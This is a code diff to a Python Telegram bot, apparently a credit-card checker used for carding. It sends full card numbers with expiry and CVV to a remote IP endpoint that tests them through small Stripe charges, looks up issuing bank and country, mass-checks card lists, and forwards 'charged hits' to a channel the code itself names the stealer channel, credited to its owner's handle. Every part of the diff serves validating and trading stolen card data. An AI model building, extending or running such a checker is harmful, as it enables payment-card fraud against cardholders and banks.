@@ -15,11 +15,26 @@ STEALER_CHANNEL_ID = -1003627495953
 MAX_MSC_LIMIT = 10 
 MAX_TSC_LIMIT = 100
 
-async def send_hit_if_approved(client: Client, text: str):
+# Owner DM Link
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
+async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
+    """Send approved card to stealer channel/group (NO CC, NO BIN, NO Bank, NO Country)"""
     try:
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
+        stealer_msg = f"""🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 🔥
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+        print(f"[Stealer] Sent charged hit to channel")
     except Exception as e:
-        print(f"[Stealer Error] Failed to forward: {e}")
+        print(f"[Stealer Error] Failed to send to channel: {e}")
 
 async def call_stripe_api(fullcc):
     endpoint_url = f"http://138.128.240.15:8022/stripe_charge012?cc={fullcc}"
@@ -82,17 +97,17 @@ async def stripe_charge_cmd(Client, message):
         
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, quote=True)
 
         secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
@@ -104,28 +119,38 @@ async def stripe_charge_cmd(Client, message):
 
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        finalresp = f"""
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
-[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
-[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
+        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status or "🔥" in status:
+            # Send to stealer channel (NO CC, NO BIN, NO Bank, NO Country)
+            await send_hit_to_stealer(
+                Client, fullcc, status, response, gateway, 
+                time.perf_counter() - start, first_name, role
+            )
+
+        finalresp = f"""{status}
+
+{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand} — {type_} — {level}
+{SYMBOL} 𝗕ᴀɴᴋ: {bank}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
         await asyncio.sleep(0.5)
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
         await setantispamtime(user_id)
         await deductcredit(user_id)
-        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
-            await send_hit_if_approved(Client, finalresp)
+
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
@@ -219,52 +244,157 @@ async def stripe_txt_check_cmd(Client, message):
 
 # --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
-    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴀʀɢᴇ</b> ✧
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
-
-[玄] 𝙂𝙖𝙩𝙚 -» Stripe Charge 0.12$
-[玄] 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
-━━━━━━━━━━━━━━━━━━━━"""
-    progress_msg = await message.reply(initial_resp, quote=True)
-    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴀʀɢᴇ</b> ✧
-━━━━━━━━━━━━━━━━━━━━
-"""
-    final_text = header_text
+    """Process multiple cards one by one with live updates"""
+    total_cards = len(ccs)
+    processed = 0
+    charged_count = 0
+    declined_count = 0
+    gateway = "Stripe Charge 0.12$"
     start_time = time.perf_counter()
     
-    for fullcc in ccs:
+    charged_cards = []
+    
+    # Send initial progress message
+    progress_text = f"""Stripe Charge
+Admin
+
+{SYMBOL} Response: Starting...
+
+Progress: 0/{total_cards}
+Charged: 0
+Declined: 0
+Remaining: {total_cards}
+
+Checked by: {first_name} ({role})"""
+    
+    progress_msg = await message.reply(progress_text, quote=True)
+    
+    for idx, fullcc in enumerate(ccs, 1):
+        processed = idx
+        remaining = total_cards - processed
+        
         status, response, gateway = await call_stripe_api(fullcc)
         
         cc_num = fullcc.split('|')[0]
         getbin = await get_bin_details(cc_num)
-        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
+        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
         
-        card_resp = f"""[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙪𝙡𝙩 -» {response}
-
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
-━━━━━━━━━━━━━━━━━━━━
-"""
-        final_text += card_resp
+        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status or "🔥" in status:
+            charged_count += 1
+            response_status = "CHARGED 🔥"
+            card_time = time.perf_counter() - start_time
+            
+            charged_cards.append({
+                "fullcc": fullcc,
+                "status": status,
+                "response": response,
+                "gateway": gateway,
+                "brand": f"{brand} — {type_} — {level}",
+                "bank": bank,
+                "country": country,
+                "flag": flag,
+                "time": card_time
+            })
+            
+            # Send to stealer channel (NO CC, NO BIN, NO Bank, NO Country)
+            await send_hit_to_stealer(
+                Client, fullcc, status, response, gateway, 
+                card_time, first_name, role
+            )
+        else:
+            declined_count += 1
+            response_status = "DECLINED ❌"
         
+        # Update progress
         try:
-            await progress_msg.edit_text(final_text, disable_web_page_preview=True)
+            await Client.edit_message_text(
+                message.chat.id, 
+                progress_msg.id, 
+                f"""Stripe Charge
+Admin
+
+{SYMBOL} Response: {response_status}
+
+Progress: {processed}/{total_cards}
+Charged: {charged_count}
+Declined: {declined_count}
+Remaining: {remaining}
+
+Checked by: {first_name} ({role})"""
+            )
         except:
             pass
         
         await asyncio.sleep(0.5)
-
-    elapsed_time = round(time.perf_counter() - start_time, 2)
-    footer = f"""[玄] 𝙏𝙞𝙢𝙚 -» {elapsed_time}s
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={user_id}'>{first_name}</a> ↯ {role}
-[玄] 𝙊𝙬𝙣𝙚𝙧 -» @spid_3r
-━━━━━━━━━━━━━━━━━━━━"""
     
-    final_text += footer
-    await progress_msg.edit_text(final_text, disable_web_page_preview=True)
+    # Delete progress message
+    await progress_msg.delete()
+    
+    # Send each charged card as separate message (SHOW EVERYTHING)
+    for card in charged_cards:
+        charged_msg = f"""{card['status']}
+
+{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
+{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
+        await message.reply_text(charged_msg, quote=True)
+        await asyncio.sleep(0.5)
+    
+    # Send declined summary
+    elapsed_time = round(time.perf_counter() - start_time, 2)
+    
+    if charged_count > 0:
+        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
+
+━━━━━━━━━━━━━━━━━━━━
+"""
+        # Show first 15 declined cards
+        declined_list = []
+        for fullcc in ccs:
+            if fullcc not in [card['fullcc'] for card in charged_cards]:
+                declined_list.append(fullcc)
+        
+        for card in declined_list[:15]:
+            declined_summary += f"{SYMBOL} {card} → Declined\n"
+        
+        if declined_count > 15:
+            declined_summary += f"\n... and {declined_count - 15} more declined cards"
+        
+        declined_summary += f"""
+━━━━━━━━━━━━━━━━━━━━
+🔥 Charged: {charged_count}
+❌ Declined: {declined_count}
+📊 Total: {total_cards}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
+        await message.reply_text(declined_summary, quote=True)
+    else:
+        # No charged cards
+        await message.reply_text(
+            f"""❌ 𝗡ᴏ 𝗖ʜᴀʀɢᴇᴅ 𝗖ᴀʀᴅs
+
+━━━━━━━━━━━━━━━━━━━━
+📊 Total Cards: {total_cards}
+❌ All Declined: {declined_count}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+            quote=True
+        )
+    
     await setantispamtime(user_id)
